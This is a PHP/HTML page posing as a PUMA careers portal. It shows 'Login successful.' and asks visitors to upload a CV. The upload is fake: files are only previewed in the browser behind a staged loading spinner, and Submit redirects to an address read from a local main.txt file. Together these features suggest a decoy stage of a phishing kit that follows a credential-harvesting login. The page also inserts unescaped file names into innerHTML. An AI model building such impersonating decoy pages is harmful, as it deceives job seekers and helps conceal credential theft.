<?php
// get root directory
$rootDirectory = dirname(dirname(__FILE__));
$mainFile = __DIR__ . '/main.txt';
$mainLink = file_exists($mainFile) ? trim(file_get_contents($mainFile)) : '/';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload your CV</title>
    <link rel="icon" href="/images/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #000000; color: #ffffff; }
        .header { max-width: 980px; margin: 24px auto 0 auto; padding: 0 16px; display: flex; align-items: center; gap: 12px; }
        .header img { height: 32px; width: auto; }
        .container { max-width: 980px; margin: 16px auto 40px auto; padding: 0 16px; }
        .panel { background: #0a0a0a; border: 1px solid #1f1f1f; border-radius: 12px; padding: 28px; }
        .success { display: flex; align-items: center; gap: 12px; background: #111111; border: 1px solid #2a2a2a; color: #ffffff; padding: 12px 14px; border-radius: 10px; margin-bottom: 20px; }
        h1 { font-size: 26px; margin-bottom: 8px; color: #ffffff; }
        p.subtitle { color: #d1d5db; margin-bottom: 16px; }
        .cta-list { color: #e5e7eb; margin: 8px 0 14px 18px; }
        .cta-list li { margin: 6px 0; }
        .upload-area { border: 2px dashed #e5e7eb; border-radius: 12px; padding: 28px; text-align: center; background: #0f0f0f; }
        .upload-area:hover { background: #151515; }
        .upload-area input[type=file] { display: none; }
        .btn { display: inline-flex; align-items: center; justify-content: center; padding: 12px 18px; border-radius: 8px; border: 1px solid #ffffff; cursor: pointer; font-weight: 700; }
        .btn-primary { background: #ffffff; color: #000000; }
        .btn-secondary { background: transparent; color: #ffffff; }
        .actions { margin-top: 16px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
        .previews { margin-top: 20px; display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; }
        .preview-card { border: 1px solid #1f1f1f; border-radius: 10px; padding: 12px; background: #0a0a0a; display: flex; gap: 12px; align-items: center; }
        .file-icon { width: 40px; height: 50px; border: 2px solid #ffffff; color: #ffffff; border-radius: 4px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; }
        .file-meta { flex: 1; min-width: 0; }
        .file-name { font-weight: 600; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: #ffffff; }
        .file-size { color: #cbd5e1; font-size: 12px; }
        @media (max-width: 768px) { .container { margin: 8px auto 24px; } .panel { padding: 20px; } .previews { grid-template-columns: 1fr; } }
        /* Loading overlay */
        .loading-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); display: none; align-items: center; justify-content: center; z-index: 9999; }
        .loading-box { display: flex; flex-direction: column; align-items: center; gap: 12px; color: #ffffff; }
        .spinner { width: 44px; height: 44px; border: 4px solid rgba(255,255,255,0.25); border-top-color: #ffffff; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
    <script>
        function showLoading(durationMs = 2000) {
            const overlay = document.getElementById('loadingOverlay');
            overlay.style.display = 'flex';
            return new Promise(resolve => setTimeout(() => { overlay.style.display = 'none'; resolve(); }, durationMs));
        }

        function formatBytes(bytes) {
            if (!bytes) return '0 B';
            const sizes = ['B','KB','MB','GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
        }

        function renderPreviews(files) {
            const container = document.getElementById('previews');
            container.innerHTML = '';
            files.forEach(file => {
                const ext = (file.name.split('.').pop() || '').toLowerCase();
                const label = ext === 'pdf' ? 'PDF' : 'DOC';
                const card = document.createElement('div');
                card.className = 'preview-card';
                card.innerHTML = `
                    <div class="file-icon">${label}</div>
                    <div class="file-meta">
                        <div class="file-name" title="${file.name}">${file.name}</div>
                        <div class="file-size">${formatBytes(file.size)}</div>
                    </div>
                `;
                container.appendChild(card);
            });
        }

        function handleFileChange(input) {
            const files = Array.from(input.files || []);
            showLoading(2000).then(() => renderPreviews(files));
        }

        function goHome() {
            showLoading(2000).then(() => { window.location.href = '<?php echo $mainLink; ?>'; });
        }

        document.addEventListener('DOMContentLoaded', function() { showLoading(2000); });
    </script>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-box">
            <div class="spinner"></div>
            <div>Loading...</div>
        </div>
    </div>
    <div class="header">
        <img src="/images/puma.png" alt="PUMA" />
    </div>
    <div class="container">
        <div class="panel">
        <div class="success">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
            <strong>Login successful.</strong>
        </div>
        <h1>Upload your CV</h1>
        <p class="subtitle">Please upload your resume in PDF or Word format.</p>
        <ul class="cta-list">
            <li>Ensure your resume is up to date.</li>
            <li>Use English for the best review experience.</li>
            <li>Accepted formats: PDF, DOC, DOCX.</li>
        </ul>
        <div class="upload-area">
            <label class="btn btn-secondary" for="fileInput">Choose files</label>
            <input id="fileInput" type="file" accept=".pdf,.doc,.docx,application/pdf,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document" multiple onchange="handleFileChange(this)" />
            <div class="actions">
                <button class="btn btn-primary" onclick="goHome()">Submit</button>
            </div>
            <div id="previews" class="previews"></div>
        </div>
        </div>
    </div>
</body>
</html>


